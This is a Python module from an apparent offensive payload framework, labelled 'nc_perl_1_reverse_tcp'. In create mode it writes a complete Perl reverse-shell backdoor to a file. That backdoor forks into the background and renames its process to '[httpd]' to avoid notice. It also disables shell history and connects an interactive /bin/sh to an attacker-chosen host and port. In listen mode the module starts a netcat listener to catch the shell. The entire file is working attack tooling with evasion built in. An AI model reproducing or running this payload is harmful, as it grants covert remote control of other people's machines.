import time,socket,os
from waf.libs.color  import *
from waf.libs import variable as var

info = {
        "name"        : "nc_perl_1_reverse_tcp",
        "title"       : "Payload perl",
        "module"      : "payloads/nc/perl/_1_reverse_tcp linux unix",
        "description" : "Payload creation and exploitation"
}

var.lname = ["payload.pl"]
var.ltype = ["listen"]

options ={
  "LHOST" : [str(var.lhost[0]),'The listen address'],
  "LPORT" : [str(var.lport[0]),'The listen port'],
  "LNAME" : [str(var.lname[0]),'The name of payload'],
  "LTYPE" : [str(var.ltype[0]),'Choose listen or create <listen / create>']
}

def running():
    try:
        if var.ltype[0] == "CREATE" or var.ltype[0] == "create":
            print ("")
            print (blue+"[*]"+default+ "Create a backdour")
            time.sleep(2)
            print ("")
            time.sleep(2)
            print ("")
            print (green_underline+"[*] Done"+default)
            time.sleep(2)
            print ("")
            mark = '"'
            f = open(var.lname[0] , 'w')
            payload = """

use strict;
use Socket;
use FileHandle;
use POSIX;
my $VERSION = "1.0";

# Where to send the reverse shell.  Change these.
my $ip = """ +mark+var.lhost[0]+mark+ """;
my $port = """+var.lport[0]+""";

# Options
my $daemon = 1;
my $auth   = 0; # 0 means authentication is disabled and any
        # source IP can access the reverse shell
my $authorised_client_pattern = qr(^127\.0\.0\.1$);

# Declarations
my $global_page = "";
my $fake_process_name = "/usr/sbin/apache";

# Change the process name to be less conspicious
$0 = "[httpd]";

# Authenticate based on source IP address if required
if (defined($ENV{'REMOTE_ADDR'})) {
    cgiprint("Browser IP address appears to be: $ENV{'REMOTE_ADDR'}");

    if ($auth) {
        unless ($ENV{'REMOTE_ADDR'} =~ $authorised_client_pattern) {
            cgiprint("ERROR: Your client isn't authorised to view this page");
            cgiexit();
        }
    }
} elsif ($auth) {
    cgiprint("ERROR: Authentication is enabled, but I couldn't determine your IP address.  Denying access");
    cgiexit(0);
}

# Background and dissociate from parent process if required
if ($daemon) {
    my $pid = fork();
    if ($pid) {
        cgiexit(0); # parent exits
    }

    setsid();
    chdir('/');
    umask(0);
}

# Make TCP connection for reverse shell
socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {
    cgiprint("Sent reverse shell to $ip:$port");
    cgiprintpage();
} else {
    cgiprint("Couldn't open reverse shell to $ip:$port: $!");
    cgiexit();
}

# Redirect STDIN, STDOUT and STDERR to the TCP connection
open(STDIN, ">&SOCK");
open(STDOUT,">&SOCK");
open(STDERR,">&SOCK");
$ENV{'HISTFILE'} = '/dev/null';
system("w;uname -a;id;pwd");
exec({"/bin/sh"} ($fake_process_name, "-i"));

# Wrapper around print
sub cgiprint {
    my $line = shift;
    $line .= "<p>\n";
    $global_page .= $line;
}

# Wrapper around exit
sub cgiexit {
    cgiprintpage();
    exit 0; # 0 to ensure we don't give a 500 response.
}

# Form HTTP response using all the messages gathered by cgiprint so far
sub cgiprintpage {
    print "Content-Length: " . length($global_page) . "\r
Connection: close\r
Content-Type: text\/html\r\n\r\n" . $global_page;
}

"""
            f.write(payload)
            f.close()

        elif var.ltype[0] == "LISTEN" or var.ltype[0] == "listen":
            os.system("nc -l -p "+str(var.lport[0])+" -v")
        else:
            print (red+"[-]"+default+"Choose LTYPE " )
    except Exception as e:
        print(red+"\n[-]"+default+"Error : "+str(e))
